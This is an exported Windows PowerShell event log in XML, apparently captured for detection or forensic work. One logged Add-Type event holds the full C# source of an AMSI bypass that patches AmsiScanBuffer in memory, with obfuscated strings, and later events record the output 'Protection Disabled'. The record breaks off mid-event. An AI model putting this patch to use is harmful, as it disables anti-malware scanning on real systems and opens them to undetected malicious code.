<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:49.868324"></TimeCreated>
<EventRecordID>3758</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-485e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">5b6975ad-26cf-4f35-a181-ba08c41a2a31</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:49.868376"></TimeCreated>
<EventRecordID>3759</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-485e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">5b6975ad-26cf-4f35-a181-ba08c41a2a31</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.030663"></TimeCreated>
<EventRecordID>3760</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-485e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">d22fc536-a6e6-4a8f-af21-e77b99986707</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.032473"></TimeCreated>
<EventRecordID>3761</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-485e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">d22fc536-a6e6-4a8f-af21-e77b99986707</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.690187"></TimeCreated>
<EventRecordID>3762</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-4b5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 55
        Command Name = Add-Type
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 214
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Add-Type): "Add-Type"
ParameterBinding(Add-Type): name="TypeDefinition"; value="using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static bool Patch() {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }
}"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.700609"></TimeCreated>
<EventRecordID>3763</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-575e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 55
        Command Name = Write-Output
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 216
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Write-Output): "Write-Output"
ParameterBinding(Write-Output): name="InputObject"; value="Protection Disabled"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.700628"></TimeCreated>
<EventRecordID>3764</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-575e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1ee742d9-fa38-414f-8ce6-ee2647069140</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.700644"></TimeCreated>
<EventRecordID>3765</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-9059-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">a1ce1339-a611-4cb5-8b27-4f7b545b9485</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.700840"></TimeCreated>
<EventRecordID>3766</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-8f59-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 55
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 218
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
ParameterBinding(Out-Default): name="InputObject"; value="Protection Disabled"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.701328"></TimeCreated>
<EventRecordID>3767</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-a012-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="10116"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">34aecddc-0c86-4d33-ac3f-ea406960ccef</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.701391"></TimeCreated>
<EventRecordID>3768</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-a012-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="10116"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">34aecddc-0c86-4d33-ac3f-ea406960ccef</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.701998"></TimeCreated>
<EventRecordID>3769</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5a5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">prompt</Data>
<Data Name="ScriptBlockId">2b0ea8e9-05a1-4ec3-9da5-fbd2b386864b</Data>
<Data Name="Path"></Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.702002"></TimeCreated>
<EventRecordID>3770</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5a5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">2b0ea8e9-05a1-4ec3-9da5-fbd2b386864b</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.702068"></TimeCreated>
<EventRecordID>3771</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5b5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1a8b102e-758f-405f-af6e-5b82d08a2a07</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.702152"></TimeCreated>
<EventRecordID>3772</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5b5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1a8b102e-758f-405f-af6e-5b82d08a2a07</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.702162"></TimeCreated>
<EventRecordID>3773</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5b5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">2b0ea8e9-05a1-4ec3-9da5-fbd2b386864b</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.702694"></TimeCreated>
<EventRecordID>3774</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5c5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">8a832e35-24e1-4fa8-a129-0098e18f7f1d</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:50.703178"></TimeCreated>
<EventRecordID>3775</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5d5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 58
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadLine\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 220
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.992409"></TimeCreated>
<EventRecordID>3776</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5d5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">8a832e35-24e1-4fa8-a129-0098e18f7f1d</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.993614"></TimeCreated>
<EventRecordID>3777</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5c5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 58
        Command Name = PSConsoleHostReadLine
        Command Type = Function
        Script Name = 
        Command Path = 
        Sequence Number = 222
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.997328"></TimeCreated>
<EventRecordID>3778</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0002-fa17-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">prompt</Data>
<Data Name="ScriptBlockId">c8199b0e-8e13-48a0-a750-74ece90e7aa0</Data>
<Data Name="Path"></Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.997332"></TimeCreated>
<EventRecordID>3779</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0002-fa17-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">c8199b0e-8e13-48a0-a750-74ece90e7aa0</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.997620"></TimeCreated>
<EventRecordID>3780</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0002-fb17-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1a8b102e-758f-405f-af6e-5b82d08a2a07</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.997787"></TimeCreated>
<EventRecordID>3781</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0002-fb17-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1a8b102e-758f-405f-af6e-5b82d08a2a07</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.997805"></TimeCreated>
<EventRecordID>3782</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0002-fb17-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
